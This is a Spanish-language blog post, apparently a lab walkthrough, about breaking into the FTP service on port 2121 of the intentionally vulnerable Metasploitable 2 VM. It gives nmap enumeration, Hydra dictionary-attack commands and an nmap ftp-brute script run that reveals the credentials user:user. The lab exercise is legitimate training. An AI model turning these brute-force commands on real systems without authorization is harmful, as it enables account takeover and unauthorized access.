---
layout: post
title: Metasploitable 2, el otro FTP del puerto 2121
category: Hacking
comments: true
description: En otros articulos hable del FTP del puerto 21, pero Nmap nos dice que hay otro FTP puesto en el puerto 2121, en este articulo hablare de como poder vulnerar este servicio, y no sera con un exploit manual o mediante metasploit, sino con fuerza bruta.

tags:       
    - hacker
    - metasploitable2
    - metasploit
    - nmap
    - hydra
---

En otros articulos hable del FTP del puerto 21, pero Nmap nos dice que hay otro FTP puesto en el puerto 2121, en este articulo hablare de como poder vulnerar este servicio, y no sera con un exploit manual o mediante metasploit, sino con fuerza bruta.

Para descargarte [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/){:target="_blank"}

## Los puertos de Metasploitable 2

Como recordaras al explorar la maquina de Metasploitable 2 con Nmap nos daba el siguiente resultado:

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00037s latency).
Not shown: 65501 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
4239/tcp  filtered vrml-multi-use
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
27242/tcp filtered unknown
34652/tcp open     unknown
35474/tcp filtered unknown
41271/tcp open     unknown
41542/tcp open     unknown
42726/tcp open     unknown
54399/tcp filtered unknown
MAC Address: 00:0C:29:D3:5F:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 185.82 seconds

{% endhighlight %}

## El puerto 2121

Nmap nos pone que en el puerto 2121 hay un servicio de FTP llamado ccproxy-ftp, pero como necesitamos más le pedimos, más informacion con -sV

{% highlight sql linenos %}

nmap -sT -p 2121  -sV  -T5 192.168.1.39

{% endhighlight %}

Y nos devuelve:

{% highlight sql linenos %}

Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-13 13:36 CEST
Nmap scan report for 192.168.1.39
Host is up (0.00060s latency).

PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.1
MAC Address: 00:0C:29:D3:5F:CD (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds

{% endhighlight %}

Nmap nos devuelve que este server es un ProFTPD 1.3.1, si buscamos algun exploit para esta versión, no encontramos ninguno, ni en Metasploit ni en searchsploit, por lo que tendriamos que ver otras opciones.

## Ataque por diccionario

La opción principal seria aqui, haber sacado usuarios del sistema durante la fase de enumeración y con ello poder hacer un ataque de diccionario, para ello usaremos la aplicación Hydra, pre-instalada en Kali Linux.

Para hacer este ataque tenemos tres opciones:

* No saber los usuarios

Esta es la peor, ya que nos toca recorrer dos diccionarios y combinarlos entre ellos, es la opción que más tarda. Recueda Kali tiene diccionarios ya en el sistema, pero eso no te impide crear tu otros diccionarios o descargarte nuevos.

<figure>
<img alt="Hydra funcionando a pleno rendimiento" class="img img-responsive" src="/resources/images/hydra.png"/>
<figcaption>
Hydra funcionando a pleno rendimiento
</figcaption>
</figure>

{% highlight sql linenos %}

hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://192.168.1.39:2121


{% endhighlight %}

* Saber el usuario, pero no el password

Puede que durante nuestra fase de enumeración, hayamos conseguido nombres de usuario, con ello podemos probar hydra, solo combinando con passwords, es una opción rapida.

{% highlight sql linenos %}

hydra -l user -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://192.168.1.39:2121

{% endhighlight %}

* Combinación de usuarios y passwords por defecto

La mejor opción es tener una lista de usuarios y passwords ya hecha e Hydra probara esas combinaciones por si alguna es valida. En este caso en Hydra tenemos que usar la opción -C usando un fichero con usuarios y passwords separados con : ejemplo: usuario:password

{% highlight sql linenos %}

hydra -C passwords.txt ftp://192.168.1.39:2121

{% endhighlight %}

## Y al final NMAP gana...

Y al final un script simple de Nmap se lleva el gato al agua, simplemente usando un script de Nmap, tenemos ya un usuario de FTP que poder entrar.
Este es el comando que he usado, pidiendo que se ejecuten todos los scripts relacionados con FTP.

{% highlight sql linenos %}

nmap -sT -sV -p 2121 --script ftp* -T5 192.168.1.39

{% endhighlight %}

El resultado

{% highlight sql linenos %}

Nmap scan report for 192.168.1.39
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
2121/tcp open  ftp     ProFTPD 1.3.1
| ftp-brute: 
|   Accounts: 
|     user:user - Valid credentials
|_  Statistics: Performed 11296 guesses in 182 seconds, average tps: 75.9
MAC Address: 00:0C:29:D3:5F:CD (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds


{% endhighlight %}

Es decir, el usuario es user, y el password es user... Ya podemos entrar y tener acceso a un FTP.





